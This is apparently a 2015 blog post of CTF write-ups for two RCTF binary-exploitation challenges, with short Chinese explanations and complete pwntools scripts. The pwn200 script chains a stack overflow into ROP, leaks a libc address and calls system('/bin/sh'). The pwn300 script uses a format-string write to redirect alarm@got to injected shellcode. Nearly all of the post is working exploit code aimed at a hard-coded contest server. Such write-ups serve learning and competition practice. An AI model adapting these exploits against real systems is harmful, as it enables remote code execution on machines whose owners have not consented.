---
layout: post
title: "rctf"
date: 2015-11-15 22:06:45 +0800
comments: true
categories: 
---
 Pwn200
直接栈溢出，因为有\x00截断，把rsp升高接着ROP，没有给libc，暴力破解libc

    from pwn import *
    #p = process('./welpwn0')
    #p = remote('127.0.0.1', 6666)
    p = remote('180.76.178.48', 6666)
    pop_rdi_ret = 0x00000000004008a3 
    pop_rsi_pop_ret = 0x00000000004008a1 
    write_plt = 0x04005B0
    got = 0x601018 
    main = 0x04007CD
    add_esp8 = 0x0000000000400585
    pop5_ret = 0x000000000040089c 
    puts_plt = 0x04005A0
    raw_input()
    print p.recvuntil('RCTF')
    def leak(addr):
    #    print p.recvuntil('RCTF')
    
    	payload  = ''
    	payload = payload.ljust(0x16, 'a')
    	payload += 'bc'
    	payload += p64(pop5_ret)
    	payload += p64(pop_rdi_ret)
    	payload += p64(addr)
    	payload += p64(puts_plt)
    	payload += p64(main)
    #	payload += p64(main)
    	#print 'hex',payload.encode('hex')
    	p.sendline(payload)
    	
    	data = p.recvuntil('RCTF')
    	data = p.recv(1024)
    	data += p.recv(1024)
    	#data += p.recv(1024)
    	#data += p.recvuntil('We')
    	#print 'data',data
    	print '----------------'
    	print data
    	print 'data hex:',data.encode('hex')
    	for j in range(len(data)):
    		if data[len(data)-j -1 ] == '\n':
    			n = len(data)-j-1
    			break
    	i = int(data.find('\x9c\x08\x40')) + 3
    	#print 'n:%d i:%d'%(n,i)
    	if n-i>8:
    		print 'over flow'
    		n = i + 8
    		print 'n:%d i:%d'%(n,i)
    	print 'hexhex:',data[i:n].encode('hex')
    	ad = u64(data[i:n].ljust(8, '\x00'))
    	print hex(addr), ' -> ',hex(ad)
    	print '----------------'
    	return p64(ad)
    write_r = leak(got+8)
    write_r = u64(write_r)
    
    
    libc = ELF('libc-2.19_15.so')
    #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    iter = libc.search('/bin/sh')
    binsh_l = iter.next()
    write_l = libc.symbols['write']
    system_l = libc.symbols['system']
    system_r = system_l - write_l + write_r
    binsh_r = binsh_l - write_l + write_r
    print 'system_r',hex(system_r)
    print 'system_l',hex(system_l)
    print 'binsh_r',hex(binsh_r)
    
    payload  = ''
    payload = payload.ljust(0x16, 'a')
    payload += 'bc'
    payload += p64(pop5_ret)
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_r)
    payload += p64(system_r)
    payload += p64(main)
    p.sendline(payload)
    
    p.interactive()


pwn300
格式化字符串漏洞，先利用栈上的一个指针把栈上的指针改成要指向栈上的另一个指针，就可一任意地址写入，把shellcode写在栈上，把alarm@got改成shellcode地址，把old eip的第一位改成main函数就会执行alarm即shellcode

    from pwn import *
    from base64 import *
    #p = process('./nobug')
    p = remote('180.76.178.48', 8888)
    payload  = '' 
    payload += '%20$x'
    print payload
    payload = b64encode(payload)
    raw_input()
    p.sendline(payload)
    off = int(p.recvline(), 16)
    print 'off:',hex(off)
    stack = off
    off = off&0xff
    print 'off:',hex(off)
    
    def b_write(addr_r, cont):
    	for j in range(4):
    		addr = addr_r
    		for i in range(4):
    			mid = off+i
    			delta = mid
    			payload  = '' 
    			if delta<8:
    				payload += 'a'*delta
    			else:
    				payload += '%'+str(delta)+'x'
    			payload += '%12$hhn'
    			#payload += '----%4$x----'
    			print payload
    			payload = b64encode(payload)
    			p.sendline(payload)	#change mid_p
    			#p.interactive()
    						
    			delta = addr & 0xff
    			addr = addr>>8
    			payload  = '' 
    			if delta<8:
    				payload += 'a'*delta
    			else:
    				payload += '%'+str(delta)+'x'
    			payload += '%20$hhn'
    			print payload
    			payload = b64encode(payload)
    			p.sendline(payload)
    		
    		delta = cont & 0xff
    		cont = cont >> 8
    		payload  = '' 
    		if delta<8:
    			payload += 'a'*delta
    		else:
    			payload += '%'+str(delta)+'x'
    		payload += '%28$hhn'
    		payload += 'addr cont: %28$x'
    		print 'payload:',payload
    		payload = b64encode(payload)
    		p.sendline(payload)
    		#addr_r += 1
    
    def write(addr_r, cont):
    	for j in range(4):
    		addr = addr_r
    		for i in range(4):
    			mid = off+i
    			delta = mid
    			payload  = '' 
    			if delta<8:
    				payload += 'a'*delta
    			else:
    				payload += '%'+str(delta)+'x'
    			payload += '%12$hhn'
    			#payload += '----%4$x----'
    			print payload
    			payload = b64encode(payload)
    			p.sendline(payload)	#change mid_p
    			#p.interactive()
    						
    			delta = addr & 0xff
    			addr = addr>>8
    			payload  = '' 
    			if delta<8:
    				payload += 'a'*delta
    			else:
    				payload += '%'+str(delta)+'x'
    			payload += '%20$hhn'
    			print payload
    			payload = b64encode(payload)
    			p.sendline(payload)
    		
    		delta = cont & 0xff
    		cont = cont >> 8
    		payload  = '' 
    		if delta<8:
    			payload += 'a'*delta
    		else:
    			payload += '%'+str(delta)+'x'
    		payload += '%28$hhn'
    		payload += 'addr cont: %28$x'
    		print payload
    		payload = b64encode(payload)
    		p.sendline(payload)
    		addr_r += 1
    
    shellcode_addr = stack+0x80
    log.success(hex(shellcode_addr))
    raw_input('alarm')
    write(0x804a014, shellcode_addr)		#chang alarm
    
    #write shellcode
    #shellcode = "\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
    shellcode = "\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87"
    
    shellcode = shellcode.ljust((len(shellcode)/4+1)*4, '\x90')
    for i in range(len(shellcode)/4):
    	tmp = shellcode[4*i:4*i+4]
    	tmp = u32(tmp)
    	write(shellcode_addr+4*i,tmp)
    	#raw_input()
    
    
    addr = stack - 0x98 + 0x5c
    print 'addr:',hex(addr)
    b_write(addr, 0xaabbcced)
    p.interactive()

